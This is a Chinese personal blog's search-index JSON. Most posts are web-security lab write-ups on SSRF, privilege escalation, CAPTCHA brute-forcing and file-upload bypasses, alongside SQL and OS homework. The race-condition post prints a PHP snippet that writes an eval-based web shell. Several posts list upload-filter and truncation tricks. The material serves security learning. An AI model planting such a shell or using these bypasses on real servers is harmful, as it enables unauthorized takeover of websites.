{"meta":{"title":"伏诗","subtitle":"","description":"","author":"伏诗","url":"http://wxnsoul.github.io","root":"/"},"pages":[{"title":"categories","text":"","path":"categories/index.html","date":"03-31","excerpt":""},{"title":"about","text":"自己的急性子需要改改啦~~blog就是一个很好的选择 平平凡凡普通人一枚,尽自己所能去美好的活着 新的一年,一定要成功减肥,吼吼吼","path":"about/index.html","date":"03-31","excerpt":""},{"title":"tags","text":"","path":"tags/index.html","date":"03-31","excerpt":""}],"posts":[{"title":"SSRF--zkaq靶场","text":"原理 当一些网站可以传参去访问其他站点时,并且参数没有被过滤,那么就可以利用一些dict,file协议来让页面返回一些敏感信息File协议 中文意思：本地文件传输协议什么是File：File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样 解题 一开始提交了一个百度的页面,提交确实跳转到了百度)尝试输入dict://127.0.0.1:3306页面有返回这是数据库的版本然后用抓包找出所有有信息的端口)Payload设置数字从1-65535(所有端口)可以看到只有80,81,3306,6379四个端口可以使用,逐一尝试 这边要先普及一些小知识,这四个端口扫出来的是内网的可以使用的端口http://59.63.200.79:8019/index.php?ur看服务器的url,8019是访问外网的端口.这其中有什么区别呢?访问外网的8019端口,经路由器转发映射,到内网时就会变换成可以访问的内网端口现在一般都是一个ip,里面有着十几几十台服务器,然后通过路由器转发映射来达到访问 继续解题,这边使用file协议却显示404bad request,,,因为ssrf一般不支持file协议,转http协议,去尝试可以看到出来一个一模一样的页面,从而得知,外网的8019端口经路由器的转发映射就变成了内网的80端口,,他们是同一个这边再尝试一下81端口,但是啥都没有,这边是风哥设置的,让我们不要被浏览器所欺骗,应该查看页面源代码拿到flag","path":"2020/04/08/SSRF-zkaq靶场/","date":"04-08","excerpt":"","tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://wxnsoul.github.io/tags/SSRF/"}]},{"title":"SSRF","text":"前言 XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站XSS跨站脚本攻击CSRF跨站请求伪造SSRF服务器端请求伪造 定义 SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人） 形成原因 SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。上面的话说的有点抽象，然后说一下网上大佬的理解首先，我们要对目标网站的架构了解，脑子了要有一个架构图。比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。正常用户访问网站的流程是：输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应比如,【某个网站有个请求是www.baidu,com/xxx.php?image=URL】那么产生SSRF漏洞的环节在哪里呢？安全的网站应接收请求后，检测请求的合法性产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据例如：www.baidu.com/xxx.php?image=www.abc.com/1.jpg如果我们将www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码终极简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。实例 访问ip.cn它会显示你的外网ip,我们可以利用百度的翻译网页的功能让百度翻译区翻译ip.cn,外网ip就变成南京而不是江苏无锡了,因为是百度在南京的服务器去访问了所以翻译网站如果对输入的参数没有过滤就会存在SSRF 作用 现在主流的防御方法:外网防御很强悍,但是内网很脆弱 1.隐藏自己2.进入内网进行开心的渗透3.MySQL是不允许外部访问的,但是对于自己本地没有防护4.可以更好的对那台存在SSRF漏洞的服务器进行攻击SSRF支持的协议:file(访问本机文件的协议),dict(用于探测)http(访问内网的协议) 靶场实战 传送门:","path":"2020/04/08/SSRF/","date":"04-08","excerpt":"","tags":[{"name":"SSRF","slug":"SSRF","permalink":"http://wxnsoul.github.io/tags/SSRF/"}]},{"title":"越权--zkaq靶场","text":"解法一 线路一用不了,去线路二,注册帐号先))使用burp抓包,很明显有两个敏感的字段userID和admin,先尝试修改UserId,改为1(因为一般admin为1)注意后面几个数据包的userID也要全部改成1,此时显示修改成功.尝试登录,却失败了,一直是失败的.尝试了好几次都是失败的.后来看录播发现是在点修改资料的时候就开始抓包了.这我就产生了一个问题:修改资料不抓包,修改密码时把userid改成1不应该也是修改的管理员账号的密码吗?)在修改资料是抓包,改掉id变为1)返回数据包之后发现资料以及变成管理员的了)再抓包修改密码并显示成功修改)退出登录使用刚刚的密码登陆成功!在后台找到flag 解法二 这边出了uesrid很敏感,admin和shenfen这两个看到了也会很敏感尝试修改shenfen和admin)身份改为之后竟然就是管理人员了,点击后台管理)却提示说不是管理员,这时候就需要再改admin了admin的值本来是,在编程中代表的时非的意思,所以虽然身份是管理员却没有权限.把shenfen改位1,admin改为1true)依旧不是管理人员,突然明白自己只改了第一个数据包,但是发送了很多个,需要全部改掉从点击修改资料的cookie到进入后台的数据包全部被修改了,直接实现了垂直越权关于无授权访问:直接进入后台而跳过登陆页面,且还拥有管理员身份,有的网站就会存在这样的bug","path":"2020/04/08/越权-zkaq靶场/","date":"04-08","excerpt":"","tags":[{"name":"越权","slug":"越权","permalink":"http://wxnsoul.github.io/tags/%E8%B6%8A%E6%9D%83/"}]},{"title":"越权","text":"定义 越权漏洞是一种很常见的逻辑安全漏洞。是由于服务器端对客户提出的数据操作请求过分信任，忽略了对该用户操作权限的判定，导致修改相关参数就可以拥有了其他账户的增、删、查、改功能，从而导致越权漏洞。目前存在着两种越权操作类型:横向越权操作(水平越权)和纵向越权(垂直越权)操作。 水平越权 水平越权是指相同权限下不同的用户可以互相访问水平越权测试方法主要就是看看能否通过A用户操作影响到B用户 垂直越权 垂直越权是指使用权限低的用户可以访问到权限较高的用户垂直越权的测试思路就是低权限用户越权使用高权限用户的功能，比如普通用户可使用管理员功能。 总之,把握住传参就能把握住逻辑漏洞的命脉 越权测试过程 登录A用户是，正常更改或者是查看A用户信息，然后抓取数据包，将传参ID(一般不为用户名)修改为其他用户，如果成功查看或者修改了同权限其他用户的信息就属于水平越权测试。( 如果可以影响到高权限用户就是垂直越权)传参ID参数需要自己检测(常见: uid= id= user=等)通常使用burp进行爆破传参(传参可能在GET POST COOKIE)常见平行越权(不需要输入原密码的修改密码，抓包改用户名或者用户id修改他人密码,修改资料的时候修改用户id查看订单的时候，遍历订单id等) 靶场实战 传送门:","path":"2020/04/08/越权/","date":"04-08","excerpt":"","tags":[{"name":"越权","slug":"越权","permalink":"http://wxnsoul.github.io/tags/%E8%B6%8A%E6%9D%83/"}]},{"title":"SQL--实战进阶","text":"实战进阶记录对各个查询的理解~ 材料 ))) 实战 查询图书品种的总数目 查询每种图书品种的数目 group by作用:按图书名分组.聚合函数作用:在每一组中使用聚合函数得出一个值(一条记录) 查询各班的人数 查询各系的人数。需要用到depart表和student表,然后如何将这两个表连起来呢?就是student3163.学号=depart3163.学号 查询借阅图书学生的学号、姓名、书名和借书日期。用到三张表,两个连接条件 查询借有图书的学生的学号和 姓名。也只需连起两张表即可 查询每个学生的借书数目。 找出借书超过两本的学生的学号、姓名和所借图书册数。这一题做的时候卡了很久,不知道如何去判定大于2这个条件,后来想明白这题是必须使用group by得,在group by之后再去限定条件是只能够用having子句得.然后因为使用了别名as ‘图书册数’,在写having子句得时候变成了 having 借阅册数&gt;2,这样还是不对得,直接用count(*)代替借阅册数就好了.group by之前没什么变化,依旧是使用where条件连接两张表 查询借阅了“操作系统” 书的学生，输出学号、姓名及班号这题卡了一会会,因为自己少用了一个限定条件导致值重复很多,再将三张表连接起来之后还有一个图书名得条件 查询向每个班的借书总数。 若图书编号以前3位数字进行分类，查询每类图书的平均价卡住了.这题需要用到一些其他函数,substring 查询平均价高于30的图书类别。 查询图书类别的平均价、最高价这里我的定价用的是浮点是,所以没有用cast函数 假设借书期限为 45 天，查询过期未还图书的编号、书名和借书人的学号、姓名。)这题为了方便书写定义了几个变量b,o,s.还用到了一个获取现在时间得函数getdate().因为借阅时间都是14年得所以都超时被列出来了 杏向书名包括“工程”关键词的图书，输出书号、书名、作者用到了模糊查询like,where b.图书名= ‘%工程%’,%%匹配一次或者多次 查询现有图书中价格最高的图书，输出书名及作者。子查询,先查询到最高定价,然后价格=查询道德数据就能查询到是把一本书 查询所有借阅“ 程序设计” 一书的学生的学号和姓名，再查询所有借了“ 程序设计”但没有借“习题解答”的学生的学号和姓名。这题是两个查询操作,并不是只能用一个.然后用到了not in借阅了习题解答得,就是没有借得. 查询所有没有借书的学生得学号和姓名。这题同18,not in借书得就是没借得 查询每个系所借图书的总数。系名需要用到班号,所以得要三张表.将他们连接起来 查询各出版社的图书总数 查询各出版社的图书占图书总数的百分比（四舍五入到1位小数）)这里解释一个下cast函数.CAST函数用于将某种数据类型的表达式显式转换为另一种数据类型。CAST()函数的参数是一个表达式，它包括用AS关键字分隔的源值和目标数据类型。 语法：CAST (expression AS data_type)expression：任何有效的SQServer表达式。AS：用于分隔两个参数，在AS之前的是要处理的数据，在AS之后是要转换的数据类型。data_type：目标系统所提供的数据类型，包括bigint和sql_variant，不能使用用户定义的数据类型。百分比得话就需要用到cast,转换成decimal数据,做完除法运算后*100再转换成字符串类型,最后加上’%’ 查询各出版社的图书被借的数目。 总结 用到多张表可以使用参数简化表名 多张表注意连接,或者其他得限定条件 group by之前使用where限定条件,之后只能使用having子句限定条件.用到having子句时必须配合聚合函数一起使用,不能只有having子句 数据库会进行运算,会接受一些函数","path":"2020/04/08/SQL-实战进阶/","date":"04-08","excerpt":"","tags":[{"name":"SQL-DDL","slug":"SQL-DDL","permalink":"http://wxnsoul.github.io/tags/SQL-DDL/"}]},{"title":"OS习题--对分易作业2","text":"第一题 1、根据以下条件，分别利用FCFS、SPF、HRN、RR（时间片0.2）给出前三种种算法的进程调度顺序，计算每种算法中每个进程的周转时间、带权周转时间以及系统的平均周转时间、平均带权周转时间。))了解这几个概念就好:周转时间=程序最初结束时间-程序提交时间带权周转时间=周转时间/执行时间平均周转时间=所有作业周转时间之和/作业数量平均带权周转时间=所有作业带权周转时间之和/作业数量 FCFS:先来先服务,就是谁先来就先执行谁,所以顺序是1234 SPF:短作业优先算法:在当前有的作业里面选择执行时间最短的那个.8.00只有1,先执行1到9.00.那是有2,3,先执行3.然后9.10只有2,执行2.最后执行4所以是1324 HRN:高度相应比算法.求相应比,相应比高的优先执行.相应比=[(目前时间-提交时间)/执行时间]+1上题中,先进行作业1到九点,此时作业2的相应比:(9-8.5)/0.5+1=2;作业3=(9-9)/0.1+1=1;限制性作业2到9.50.此时作业3相应比:(9.50-9.00)/0.1+1=6.作业4:(9.50-9.2)/0.2+1=2.5所以先执行3,所以顺序是1234时间片轮转法就是按照我画的图来做的,这个应该比较记得清楚,毕竟自己做的.需要注意几个地方:1.执行完一个时间片之后若没执行完,此时新加入一个,那么应当排在新加入的后面2.如果时间片执行一半就执行完了,另一半不会空等着而是将下一个继续塞入剩下的半个时间片里 第二题 2、根据以下条件，利用RR（时间片q=2）进行进程调度，画出进程调度时间序列图，并计算每个进程的周转时间、带权周转时间以及系统的平均周转时间和平均带权周转时间。 第三题 3.利用记录型信号量写出不会发生死锁的五位哲学家就餐的程序。和第一次作业一样第四题 4、利用记录型信号量实现前趋图。)和第一次作业一样第五题 5、三个进程P1、P2、P3互斥使用一个包含N(N&gt;0)个单元的缓冲区。P1每次用put()将一个正整数送入缓冲区的一个单元中，P2每次用getodd()从缓冲区中取出一个奇数，P3每次用geteven()从缓冲区中取出一个偶数。试用信号量机制实现这三个进程的互斥与同步活动，用伪代码实现。 就是写程序,定义变量,函数.注意细节就好,比如说p1里对empty只有p操作,v操作应当在p2或者p3里第六题 6、桌子上有一只盘子，每次只能向其中放入一只水果。爸爸专向盘子中放苹果，妈妈专向盘子中放桔子，儿子专等吃盘子中的桔子，女儿专等吃盘子中的苹果。试用信号量机制实现这4个进程的互斥与同步活动，用伪代码实现)","path":"2020/04/08/OS习题-对分易作业2/","date":"04-08","excerpt":"","tags":[{"name":"OS习题","slug":"OS习题","permalink":"http://wxnsoul.github.io/tags/OS%E4%B9%A0%E9%A2%98/"}]},{"title":"OS习题--对分易作业1","text":"1、针对生产者-消费者问题: 写出中所定义的信号量名称、含义和初值。信号量:empty,表示缓冲区的个数(空缓冲区的个数)初始值为n;full,表示产品个数(满缓冲区的个数),初始值为0;mutex(表示互斥使用的缓冲池)初始值为1 两个wait操作可以换位置吗?为什么?不能,空缓冲区全满的情况下,此时full(缓冲区)=n,empty=0,如果先执行mutex,那么mutex变为0,再进行empty的p操作,empty就会变为-1,因为小于0所以阻塞自己.然后就会去进行消费者进行,此时mutex是0,然后先进行后变成-1也阻塞了,这样就死锁了.满缓冲区同理. 两个signal操作可以换位置吗?为什么?两个signal操作可以换位置。这两个互换位置之后只是影响进程对临界资源的释放的先后顺序，而不会引起系统死锁，因此可以互换位置。 2、利用记录型信号量写出不会发生死锁的五位哲学家就餐的程序。这段伪代码就是用来保证第i个哲学家一定能同时拿到左边两边的筷子,防止死锁.而不是其他解法,什么有一个哲学家不能吃 3、利用记录型信号量实现前趋图。 很简单,首先只要在每个箭头上从上往下从左往右的标上字母)然后再继续写伪代码,伪代码的格式也很容易记住就是p1,2,3,4,5,6,7七个函数,一个主函数,主函数里开始设置初始值,执行代码.七个函数都是统一的先执行p操作,再执行进程p,再v操作下一个流程.除了最开始的p1进程没有p操作和进程p1操作,只有单纯的v操作 总结 还是同容易理解的,把p操作当成减操作,v操作当初+操作. 实现互斥的P操作一定要在实现同步的P操作之后.互斥的就是互斥信号量mutex","path":"2020/04/07/OS习题-对分易作业1/","date":"04-07","excerpt":"","tags":[{"name":"OS习题","slug":"OS习题","permalink":"http://wxnsoul.github.io/tags/OS%E4%B9%A0%E9%A2%98/"}]},{"title":"hexo上传文章失败","text":"今天上传一篇密码找回和验证码绕过的writeup一直无法上传成功,查阅资料后发现是自己的tags定义了两次.所以失败了.有时候还会因为没有加半角空格而失败.","path":"2020/04/07/hexo上传文章失败/","date":"04-07","excerpt":"","tags":[{"name":"博客学习","slug":"博客学习","permalink":"http://wxnsoul.github.io/tags/%E5%8D%9A%E5%AE%A2%E5%AD%A6%E4%B9%A0/"}]},{"title":"验证码绕过与密码找回--zkaq靶场","text":"tips 代码审计 这个靶场有个提示,验证码是从10到10000的某一个数字,所以可以通过爆破来获得验证码 爆破验证码 )邮箱有了,输入得密码是新的,输入正确得验证码即可改掉)抓取数据包之后开始爆破,输入新密码123456已经成功登录了虽然数据包长度都一样,但是无需知道具体的验证码是哪个,全部发送出去总有一个对的,然后就会修改密码根据tips再用户管理处拿到flag","path":"2020/04/07/验证码绕过与密码找回-zkaq靶场/","date":"04-07","excerpt":"","tags":[{"name":"验证码绕过和密码找回","slug":"验证码绕过和密码找回","permalink":"http://wxnsoul.github.io/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E5%92%8C%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/"}]},{"title":"验证码绕过与密码找回","text":"一、验证码作用 验证码(CAPTCHA)是“Completely Automated Public Turing test to tell Computers and Humans Apart”(全自动区分计算机和人类的图灵测试)的缩写，是一种区分用户是计算机还是人的公共全自动程序。可以防止:恶意破解密码、刷票、论坛灌水，有效防止某个黑客对某一个特定注册用户用特定程序暴力破解方式进行不断的登陆尝试，实际上用验证码是现在很多网站通行的方式我们利用比较简易的方式实现了这个功能。这个问题可以由计算机生成并评判，但是必须只有人类才能解答。由于计算机无法解答CAPTCHA的问题，所以回答出问题的用户就可以被认为是人类。验证码五花八门，有中文字，纯数字，点击字符、数学运算…. 二、验证码绕过的常见姿势 验证码绕过方向 1.通过验证码的逻辑进行入手2.通过Python、golang等程序自动识别设置了验证码并不是完全可靠，在很多情况存在验证码绕过的情况(举例是在登录处)一、前端验证验证码，并没有后端验证。直接抓包然后进行跑数据包，反正有没有验证码的阻碍二、验证码设置了但是并没有模验，乱输验证码也能够成功的登录(估计老板没给开发工资吧)三、验证码可以重复使用，比如现在的验证码1111，然后虽然你登录失败后验证码会变，但是你输入1111他却判定你验证码正确(常 见) ht:/www. anquan.us/static/bugs/wooyun-2016-0169672.html四、.验证码空值绕过，比如，我们现在抓一个包，发现登录参数是user=admin&amp;password=admin&amp;yzm=4123.yzm验证码参数，但是我们如果去掉yzm的传参我们就可以绕过验证码机制，直接传参user=admin&amp;password=admin，验证码就失效了五、验证码可控制，比如他的验证码包含在URL里面，是-一个URL传参，我们可以把URL设置定，那么验证码可控制六、验证码有规则，比如是时间戳的后6位(rand函 数进行随机数)七、有万能验证码，验证码无论是什么，只要输入000000就能直接绕过八、验证码有的时候会藏在cookie里面，分析一下是不是存在验证码的参数上面的是属于区分人机和人的,还有一种验证码是验证是不是你本人的(接收短信验证的) 三、密码找回漏洞上述的密码找回方法会有什么样的漏洞呢?1.验证码发送后前端返回( ht://w anquan us/static/bugs/wooyun-2016-0172266.html)2.验证码无次数限制可爆破3.验证码可控(ttp://www anquan.us/static/bugs/wooyun-2014-0867 16.html)4.直接修改密码页面(http://www. anquan.us/static/bugs/wooyun-2013-040908.html)有点像越权5.缺失的身份认证–&gt;绑定别人的账号到自己的手机(http://www. anquan.us/static/bugs/wooyun-2013-016896. html)6.越权漏洞–&gt;自己验证码通过改包然后修改他们密码 靶场实战 传送门:https://wxnsoul.github.io/2020/04/07/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E4%B8%8E%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E-zkaq%E9%9D%B6%E5%9C%BA/","path":"2020/04/07/验证码绕过与密码找回/","date":"04-07","excerpt":"","tags":[{"name":"验证码绕过和密码找回","slug":"验证码绕过和密码找回","permalink":"http://wxnsoul.github.io/tags/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87%E5%92%8C%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E/"}]},{"title":"文件上传绕过姿势","text":"黑名单机制 只有前端简单的后缀名检测—直接抓包绕过前端即可 后端检测后缀名了—使用其他拓展名绕过使用其他能被解析的文件名绕过.此外还有， php: php phtml php3 php4 php5,这些都会被当成php解析所以有时可以拿phtml啥的去试一试. 上传.htaccess文件,让服务器按照.htaccess里的指令把jpg文件当作php处理 利用windows后缀名不区分大小写绕过 利用windows去解析文件的时候,会把php空格当成php去执行的.后端验证的时候接收的是’php空格’是在字符串里的,’php空格’却是不等于’php’的,毕竟空格也是一个字符,所以这边只要上传php空格后缀名即可 Windows下,在后缀名后面加上一个点.,他会提示你后缀名不可用然后把,给去掉,于是又可以利用一波 ::$DATA (Windows文 件流绕过) 逻辑漏洞.比如说按照过滤顺序,先去掉.在转换大小写,再去掉空格,那么可以这样123.php. .去完之后时123.php.又回到了之前 复写php绕过(比如说有时候会把php后缀给删去) 白名单机制 %00截断(url传参) 0x00截断(post传参) move_upload_file截断(只接受post传参) 条件竞争 asp特性 IIS分号截断 IIS斜杠截断 Nginx解析漏洞(直接加上.php访问即可)","path":"2020/04/06/文件上传绕过姿势/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"文件上端漏洞(20-23)--zkaq","text":"pass-20查看源码)虽然白名单里有asa但是if判断力依旧会去判断是否是图片文件,所以得绕过,百度制作图片马之后改成asp开始上传)发现服务器端被拦截了,就)根据特性绕过))成功上传了)根据地址访问到菜刀连接成功 pass-21 IIS分号截断 在一般得语言中,分号事结束一句代码得意思.在asp文件中,分号还能有着截断得作用,类似于0x00和%00 于是就可以这样as.asp;.jpg但也是和00截断有一点区别,当上传成功后去url中访问00截断需要把阶段以后的给删掉访问,但是asp这里就不需要,依旧要写在url中)利用分号的特性实现了绕过)根据图片的储存路径去访问,可以看到已经成功 Pass-22 IIS斜杠截断和上题唯一的区别就是把分号改成了斜杠 Pass-23 Nginx解析漏洞 )在靶场中,直接上传一张木马图,然后再url中打开,再jpg后加上/.php就能把jpg当成php执行就是直接在访问jpg文件的时候加上一个.php就行","path":"2020/04/06/文件上端漏洞-20-23-zkaq/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"文件上端漏洞(10-20)--zkaq","text":"pass-11 %00截断 )现在采用的就是白名单了,strrpos返回.最后一次出现得位置,然后substr截断赋值给file_ext,就是说获得后缀名,如果后缀名不匹配那就失败)尝试这样截断但是失败了,发现图片还被重命名了)但是还发现有一个存储路径)尝试修改))果然图片被存放到了该目录下,放到了a.php下,还被重命名了.)))这样图片就会被保存在a.php下,用图片去访问该图片,到php时就会被截断,读取不到jpg,从而用php代码去解析这张图片,达到了getshell pass-12 0x00截断 )这题是把get传参path变成了post.所以这和以前得那个宽字节注入第三题一样得改,url是会进行url编译得,但是post不会,post得改成十六进制得0x00截断)在path后加个a方便认出,然后改成00,变成0x00截断放包,后来发现不是这样改path得…)目录在最下面,应该加在下面,修改hex后成功出来 pass-13 0x00截断 13-16都是一样的 pass-17 条件竞争 首先了解一个定义一竞争 条件是什么?竞争条件”发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。线程同步机制确保两个及以上的并发进程或线程不同时执行某些特定的程序段，也被称之为临界区(criticalsection)，如果没有应用好同步技术则会发生“竞争条件”问题。在我理解就是两只哈士奇(线程)同时去抢一个丢出去的飞盘(资源)，不知道到底哪只能抢到，此处便形成了竞争。那我们上传是和谁去竞争?一般而言我们是上传了文件，上传了但是最后却因为过滤或者因为其他原因被删除了，那么我们可以使用条件竞争，我们实际上是和unlink，是和删除文件的函数进行竞争。假如我不断的上传发包，然后我同时也不断的访问那个我们上传上去的文件的地址，我们就开始和服务器的函数比手速了，函数执行都是要时间的，如果我这边上传上去，且没有删除，那个时间可能很短，然后被我访问到了，岂不是就可以执行PHP了我就比服务器手速快了&lt;?php $a = &#39;&lt;?php @eval($_REQUEST[\\&#39;a\\&#39;])?&gt;&#39;;file_put_contents(&#39;1.php&#39;,$a)?&gt;上传文件后,先验证还是先执行?如果是先上传上去然后校验,不符合删除那么服务器删除文件需要时间—-&gt; 0.01s?0.0001?0.0000001?不管怎样总是需要时间得在这期间100个线程不间断的访问这个文件 –&gt;究竟是线程先访问到还是文件删除?–&gt;只要访问得快,他就无法被删除,从而getshell&lt;–&gt;(自己经常因为某些文件正在使用而无法删除文件夹)但是如果访问过于密集被ban了那就没用了)(这串代码因为不是自己打的所以出错了很久,中间多了好几个空格,最后通过本地环境测试出来是代码有问题得)需要用过这句代码,file_put_contents()函数就是把变量a输入到1.php中去.没有1.php就会创建一个一般长传得文件在服务器端会经历 接收-&gt;转移-&gt;验证这个过程这边开始实战先上传一张jpg图片可以得到文件保存在服务器得地址,然后开始改后缀放到爆破模块,随便add个地方,然后设置no playload跑10000次,线程数设置成40,因为没有playloads,所以就是长传这个123.php10000次得意思是然后再去访问这个tj.php,设置线程60,也跑10000次很明显有几个是抢成功了数据包明显很长,里面是phpinfo信息可以在本得得环境里看到1.php确实已经上传了而且没有被重命名.Pass-18 同17也是条件竞争.并不难,需要搞清楚上传什么,访问什么就好.一开始我直接去访问1.php了.这必然是错的.另外,上传得速度比访问得速度要快才出来得,按道理说上传得比访问得慢才行 Pass-19 move_uploaded_file()截断 )15年的漏洞,存在于php5.4,5.5,5.6)一进去先试了一张正常的图片)发现有个叫保存名称的东西)打开后发现名字被重命名成刚刚的保存名称了,抓包截断试一下,让他保存成php)在最后找到这个保存得文件名称,改成这样然后去修改十六进制)已经getshell了菜刀连接getshell总结:move_upload_file函数是将上传的文件进行转移,但是转移的过程中碰到了00截断,于是只上传了截断之前的命名,从而造成了截断","path":"2020/04/06/文件上端漏洞-10-20-zkaq/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"文件上端漏洞(1-10)--zkaq","text":"pass-01 )这是一个前端验证,因为上传不是规定的文件之后会弹出提示框但是burp抓不到数据包,所以直接使用burp绕过即可)可以看到Content-Type允许的类型是image和jpg,把自己的123.jpg改成123.php后上传,成功了(123.jpg是自己制作的图片马))复制图片地址后打开此时如果传入参数a就会有上图的结果显示因为你得123.php上传到服务器了,被存储在了服务器内(想象csrf那课的文件管理)然后去访问123.php就行,a随便传参,eval让他都会当作代码执行 pass-02 做法同第一题 pass-03 )尝试抓包修改后缀绕过,失败了发现这次是后端检测后缀名,所以光是前端绕过没有用.可以用其他可以被解析的文件后缀来代替.此外还有， php: php phtml php3 php4 php5,这些都会被当成php解析,所以有时可以拿phtml啥的去试一试mark)这时候又上传成功了明显,再使用菜刀去连接 pass-04 这个文件就像你点外卖时候的备注,商家(服务器)会按你得备注(.htaccess文件)去做’虽然这个给文件功能很强大,但是一般默认不开启.(ngx和伪静态一般会用)这样制作一个htaccess文件,里面大致内容是把jpg文件当成php文件去解析但是手动是无法保存的因为没有文件名,必须使用cmd命令这是就完成了,上传123.jpg图片后,复制图片地址打开依旧是图片,然后再上传.htaccess文件服务器就按着中间件.htaccess文件同php去解析jpg了pass-05 第五题过滤了一堆东西,刚刚的基本都过滤了包括.htaccess)但是windows的后缀名试不区分大小写的,所以可以这样成功执行pass-06 这边开发又聪明了连大小写都开始防范了.但是呢,windows去解析文件的时候,会把php空格当成php去执行的.随意上传的时候上传php空格就行.后端验证的时候接收的是’php空格’是在字符串里的,’php空格’却是不等于’php’的,毕竟空格也是一个字符,所以这边只要上传php空格后缀名即可Getshell了pass-07 又加了一条首位去空函数,现在又得用新姿势了Windows下,在后缀名后面加上一个点.,他会提示你后缀名不可用然后把,给去掉,于是又可以利用一波成功getshell pass-08 ::$DATA (Windows文 件流绕过) (这 里利用到了NTFS交换数据流(ADS) ，ADS 是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流。通俗的理解，就是其它文件可以“寄宿”在某个文件身上，而在资源管理器中却只能看到宿主文件，找不到寄宿文件。)将abcd输出到1.txt,如果没有1.txt就会自动创建一个,然后将abcd存进去删除1.txt后,在输出echo abcd&gt;&gt;1.txt:2.txt桌面又会出现一个1.txt但是打开什么都没有,甚至文件大小都是0kb,因为东西在寄宿者2.txt身上,使用cmd’打开隐藏的东西就出来了,藏东西利器啊!如果你写echo &gt;&gt;1.txt:会怎么样?会变成echo &gt;&gt;1.txt::$DATA,这是自动填充的但是打开时能够看到东西的,其实平时创建文件就会自动填充::$DATA的,只是不显示给我们看罢了,所以我们可以使用这个来绕过!(自己把::$DATA填充完整来让验证匹配不上,但是这个只在Windows下有效!)))这是把::DATA去掉才能访问,因为数据库里没有123.php::$DATA这个文件!之前的123.php.也没有,但是windows会自己把.给去掉! pass-09 得,这下又把::$DATA去掉了.但还是可以绕过得,这需要从逻辑上去考虑按照过滤顺序,先去掉.在转换大小写,再去掉空格,那么可以这样123.php. .去完之后时123.php.又回到了之前))成功getshell也终于在虚拟机上连接上菜刀了,本机死活不行不晓得为啥.这边猜想应该123.php.::$DATA,123.php::$DATA 应该也是可以得,去尝试一下,经实验发现,前面一个是行得通得后面一个被发现了,仔细研究代码后发现代码删去点和删去::$DATA是有区别得,删除点只是删在文件末尾得,而删去::$DATA是匹配删去,所以躲在哪里都不行 pass-10 )开发火了,干脆把出现php得直接给删除了!(用””替换了”php”)但是这样也是可以绕过得,变成123.pphphp,删完之后就变成了123.php!!!)成功getshell 至此,黑名单类靶场已经结束了","path":"2020/04/06/文件上端漏洞-1-10-zkaq/","date":"04-06","excerpt":"","tags":[{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://wxnsoul.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"zkaq文件上传漏洞(三)","text":"ASP 是什么？ ASP 指 Active Server Pages （动态服务器页面） ASP 是一项微软公司的技术 ASP 是在 IIS 中运行的程序 IIS 指 Internet Information Services （Internet 信息服务） IIS 是 Windows 2000 及 Windows 2003 的免费组件 IIS 同时也是 Windows NT 4.0 的可选组件 此可选组件可通过因特网下载 PWS 的体积更小 - 不过拥有 IIS 的完整功能 PWS 可在 Windows 95/98 的安装 CD 中找到 ASP 文件和 HTML 文件类似 ASP 文件可包含文本、HTML、XML 和脚本 ASP 文件中的脚本可在服务器上执行。 ASP 文件的扩展名是 “.asp” ASP 和 HTML 有何不同？ 当浏览器请求某个 HTML 文件时，服务器会返回这个文件 而当浏览器请求某个 ASP 文件时，IIS 将这个请求传递至 ASP 引擎。ASP 引擎会逐行地读取这个文件，并执行文件中的脚本。最后，ASP 文件将以纯 HTML 的形式返回到浏览器。ASP 能为你做什么？ 动态地编辑、改变或者添加页面的任何内容 对由用户从 HTML 表单提交的查询或者数据作出响应 访问数据或者数据库，并向浏览器返回结果 为不同的用户定制网页，提高这些页面的可用性 